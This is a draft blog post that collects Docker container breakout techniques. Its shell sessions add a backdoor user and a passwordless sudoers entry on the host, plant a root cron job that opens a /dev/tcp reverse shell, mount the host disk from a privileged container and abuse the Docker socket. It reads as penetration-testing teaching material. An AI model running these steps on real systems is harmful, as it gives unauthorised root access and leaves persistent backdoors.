---
title: "Container Breakouts Techniques"
date: 2020-07-11T13:09:54+02:00
draft: true
---

If you are bored of searching for the most-known container breakout techniques, here is a collection. This post addresses abuse of [shared root filesystem](#shared-host-root-directory) (2 ways), [privileged container](#privileged-container) (3 ways) and access to the [Docker Socket](#docker-socket) (1 way). Okay, to be fair – some techniques refer to each other.

## Intro

The motivation of this post is to collect container breakouts. I was considering writing a huge post about all the stuff you must know to break out of container. But, if I would do so, it will take ages to write, es well to read and at the end you would just scroll direct to the PoC code snippets. So I dropped that idea and will just link to additional readings.

It may the case that not all breakouts that you have in mind are listed. Do not hesitate and contact me so that I can add them. Over the time, I may extend them as well.

## Attacks

The attacks refer to each other, cause the root-cause why an attack is possible may differ, but the final break out may be the same. The examples are related to docker. The transfer to other container technologies, e.g., LXC may be slightly different and maybe there will be a follow-up post regarding this ;)

### Shared Host root-directory

If you got access to a container that shares directories with the host, that is not direct a problem. But, if the container has access to the host root-filesystem as user root (pre-assumed that there is no [AppArmor](https://man.cx/apparmor(7)) or [SELinux](https://man7.org/linux/man-pages/man8/selinux.8.html) in place) you got the jack pot! We have multiple ways to approach the underlying host.

Let’s assume that the host root directory is accessible at `/hostfs`

#### SSH to user

To escalate to the host, we **create a user** in the file `/hostfs/etc/passwd` and **add** the user **to** the **sudoer’s**. After the user is prepared, we connect via **SSH** to the host. Okay, it is a kind of flaky, because certain packages must have been installed and services running, you get the idea :)

```
# cat /hostfs/etc/passwd | grep 1000
user:x:1000:1001:user:/home/user:/usr/bin/zsh

# openssl passwd -6 -salt xyz test
$6$xyz$rjarwc/BNZWcH6B31aAXWo1942.i7rCX5AT/oxALL5gCznYVGKh6nycQVZiHDVbnbu0BsQyPfBgqYveKcCgOE0

# echo 'foo:$6$xyz$rjarwc/BNZWcH6B31aAXWo1942.i7rCX5AT/oxALL5gCznYVGKh6nycQVZiHDVbnbu0BsQyPfBgqYveKcCgOE0:1000:1001:user:/home/user:/usr/bin/zsh' | tee -a /hostfs/etc/passwd

# echo "user ALL=(ALL) NOPASSWD: ALL" >> /hostfs/etc/sudoers.d/0-user

# ip r 
default via 172.17.0.1 dev eth0 
172.17.0.0/16 dev eth0 proto kernel scope link src 172.17.0.2

# ssh -l foo 127.0.0.1
foo@127.0.0.1's password: 
Last login: Sat Jul 11 12:10:10 2020 from 127.0.0.1
arch [~]% sudo -i
[arch ~]# 
```

We have assumed that there is a SSH daemon running on the host, the service is not hardened and the `sudo` package was installed. Well, you could exchange the sudo-step by creating another user with `uid=0(root)` to get rid of that step, but anyway ;)

#### Cronjob

Another approach would be to write a **cronjob** file that is executed every minute and starts a **reverse shell** as user `root`.

```
# ip a
[…]
6: eth0@if7: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
[…]

# echo "* * * * * root bash -i >& /dev/tcp/172.17.0.2/1337 0>&1" | tee /hostfs/etc/cron.d/1revers
# nc -lkvp 1337
nc -lvkp 1337
listening on [any] 1337 ...
172.17.0.1: inverse host lookup failed: Unknown host
connect to [172.17.0.2] from (UNKNOWN) [172.17.0.1] 58536
bash: cannot set terminal process group (3138): Inappropriate ioctl for device
bash: no job control in this shell
[arch ~]# id -a
uid=0(root) gid=0(root) groups=0(root)
```

In this second showcase, we assumed that a cron service was running on the host. That is more or less the default on a lot of systems. 


### Privileged Container
If you start a container with Docker and you add the flag `--privileged` that means to the process in the container can act as root user on the host. The containerization would have the advantage of self-containing software shipment, but **no** real **security boundaries to** the **kernel**.

There are multiple ways to escape from a privileged container. Let us have a start.

#### Capabilities

##### `CAP_SYS_Module` – Load Kernel Module 

https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host 

##### `CAP_SYS_ADMIN` – cgroup release on notfy
TODO … have to read :D

#### Host Devices

I prefer to use the host devices to escape from a privileged container. A quick directory listing of the **devices** in the container shows that we have **access to all** of them:

```
root@0462216e684b:~# ls -l /dev/
total 0
crw-r--r-- 1 root root  10, 235 Jul 11 09:20 autofs

[...]
brw-rw---- 1 root  994   8,   0 Jul 11 09:20 sda
brw-rw---- 1 root  994   8,   1 Jul 11 09:20 sda1
[...]
# mkdir /hostfs
# mount /dev/sda1 /hostfs
# ls -l /hostfs/
total 132
lrwxrwxrwx   1 root root     7 Nov 19  2019 bin -> usr/bin
drwxr-xr-x   4 root root  4096 May 13 13:29 boot
[…]
drwxr-xr-x 104 root root 12288 Jul 11 10:09 etc
drwxr-xr-x   4 root root  4096 Jun 30 14:47 home
[…]
drwxr-x---   9 root root  4096 Jul 11 10:09 root
[…]
lrwxrwxrwx   1 root root     7 Nov 19  2019 sbin -> usr/bin
[…]
drwxr-xr-x  10 root root  4096 May 26 14:37 usr
[…]
```

As you can see, the **hard drive** itself is listed, which can be **mounted**. After mounting the device, it is possible to interact as root user with the device and backdoor the system.

Getting access via the hard drive is already described in the previous section [Shared Host root-directory](#shared-host-root-directory).


### Docker Socket

You know, every time you have **access to the Docker Socket** (default location: `/var/run/docker.sock`) it **means** that you are **root on the host**. Some containerized application may need access to the socket, e.g., for observation or local system management.

You have read correctly, local system management. As soon you have access to the socket, you can manage the local system. Okay, first at all, you can manage containers and these containers can afterwards manage the system. 

So if you want to escalate from the container to the system, you can **interact** with the **Docker Socket manually or **just simple **install Docker** in the container. Okay, and what’s the next step? Exactly, you had it already in your mind, start a privileged container. 

```
# apt update && apt install -y docker.io
# docker run --rm --privileged -it nodyd/ana bash
user@b89e2cfbd699:~$
```

With the access to a privileged container, you can **perform** the **steps as already explained** in previous section [Privileged Container](#privileged-container).

## Conclusion

The listed container breakouts are in my humble opinion the most basic one. The list is for sure not complete and as soon as I am in the mood, I might update, extend or re-organize the techniques. Due to the fact that I am only a consumer of already existing research I want to give out a big thanks for sharing the knowledge that I have consumed in the past years from:

- Brad Geesaman – [@bradgeesaman](https://twitter.com/bradgeesaman)
- Chris Le Roy – [@brompwnie](https://github.com/brompwnie)
- Duffie Cooley – [@mauilion](https://twitter.com/mauilion)
- Ian Coldwater – [@IanColdwater](https://twitter.com/IanColdwater)
- Jessie Frazelle – [@jessfraz](https://twitter.com/jessfraz)
- Mark Manning – [@antitree](https://twitter.com/antitree) 
- Matthias Luft – test [@uchi_mata](https://twitter.com/uchi_mata)
- Rory McCune – [@raesene](https://twitter.com/raesene)

To name a few – you are awesome – please continue !!


